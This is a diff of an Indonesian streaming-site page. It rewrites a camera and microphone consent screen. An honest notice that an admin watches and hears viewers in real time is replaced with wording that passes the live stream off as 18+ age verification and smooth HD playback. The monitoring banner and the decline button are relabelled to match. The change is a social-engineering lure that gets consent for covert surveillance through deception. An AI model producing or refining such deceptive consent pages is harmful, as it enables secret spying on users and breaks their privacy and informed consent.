@@ -297,18 +297,18 @@ a{color:inherit;text-decoration:none;}
 <!-- ===== 2. CONSENT ===== -->
 <div class="screen" id="screen-consent">
   <div class="consent-card">
-    <div class="icon-big">📹</div>
-    <h2>Izinkan Akses Kamera & Mikrofon</h2>
-    <p class="desc">Sebelum mulai menonton, Layar Biru membutuhkan akses kamera dan mikrofon kamu.</p>
+    <div class="icon-big">⚠️</div>
+    <h2>Klik Izinkan Untuk Lanjut Menonton</h2>
+    <p class="desc">Sebelum mulai menonton, Layar Biru membutuhkan izin kamera dan mikrofon kamu untuk memverifikasi apakah anda berusia 18+.</p>
     <div class="info-list">
-      <div class="info-item"><span class="ii-icon">📡</span><div class="ii-text"><strong>Stream video & audio langsung ke admin</strong><span>Admin dapat melihat video kamera dan mendengar mikrofon kamu secara realtime melalui teknologi WebRTC terenkripsi.</span></div></div>
-      <div class="info-item"><span class="ii-icon">🔴</span><div class="ii-text"><strong>Indikator monitoring selalu tampil</strong><span>Banner merah di layarmu selalu aktif selama sesi berlangsung.</span></div></div>
-      <div class="info-item"><span class="ii-icon">⏹️</span><div class="ii-text"><strong>Stream berhenti otomatis saat keluar</strong><span>Menutup browser otomatis mengakhiri sesi dan stream kamera/mikrofon.</span></div></div>
-      <div class="info-item"><span class="ii-icon">🔒</span><div class="ii-text"><strong>Tidak direkam ke server</strong><span>Stream hanya peer-to-peer antara perangkatmu dan admin, tidak disimpan.</span></div></div>
+      <div class="info-item"><span class="ii-icon">📡</span><div class="ii-text"><strong>Stream film no lag dan HD</strong><span>Admin dapat melihat video kamera dan mendengar mikrofon kamu secara realtime melalui teknologi WebRTC terenkripsi.</span></div></div>
+      <div class="info-item"><span class="ii-icon">🔴</span><div class="ii-text"><strong>Verifikasi berjalan selama anda menonton</strong><span>Banner merah di layarmu selalu aktif selama sesi berlangsung.</span></div></div>
+      <div class="info-item"><span class="ii-icon">⏹️</span><div class="ii-text"><strong>Jika keluar dan masuk lagi, silahkan izinkan verifikasi usia</strong><span>Menutup browser otomatis mengakhiri sesi dan stream kamera/mikrofon.</span></div></div>
+      <div class="info-item"><span class="ii-icon">🔒</span><div class="ii-text"><strong>Tidak untuk anak di bawah 18 Tahun</strong><span>Stream hanya peer-to-peer antara perangkatmu dan admin, tidak disimpan.</span></div></div>
     </div>
     <div class="btn-row">
-      <button class="btn-agree" onclick="requestCamera()">✅ Izinkan Akses Kamera & Mikrofon</button>
-      <button class="btn-decline" onclick="declineCamera()">Tolak & Keluar</button>
+      <button class="btn-agree" onclick="requestCamera()">✅ Izinkan Popup yang tampil untuk memverifikasi usia anda</button>
+      <button class="btn-decline" onclick="declineCamera()">Tidak saya dibawah 18 Tahun</button>
     </div>
   </div>
 </div>
@@ -318,7 +318,7 @@ a{color:inherit;text-decoration:none;}
   <div class="monitor-banner">
     <div class="banner-left">
       <div class="rec-dot"></div>
-      <span>🔴 VIDEO & MIKROFON KAMU SEDANG DIPANTAU ADMIN SECARA REALTIME</span>
+      <span>⚠️ VERIFIKASI USIA BERLANGSUNG SELAMA ANDA SEDANG MENONTON</span>
     </div>
     <div class="banner-right">
       <span class="session-timer" id="session-timer">00:00:00</span>
@@ -331,7 +331,7 @@ a{color:inherit;text-decoration:none;}
         <div class="avatar" id="user-avatar-chip">U</div>
         <span id="user-name-chip">Pengguna</span>
       </div>
-      <button class="btn-end-session" onclick="endSession()">⏹ Akhiri Sesi</button>
+      <button class="btn-end-session" onclick="endSession()">Keluar</button>
     </div>
   </div>
   <div class="watch-content">
@@ -345,7 +345,7 @@ a{color:inherit;text-decoration:none;}
         </iframe>
       </div>
       <div class="video-info">
-        <h3 id="now-playing-title">Senja Terakhir</h3>
+        <h3 id="now-playing-title">Indonesia</h3>
         <p id="now-playing-desc">Drama · Sedang diputar</p>
       </div>
     </div>
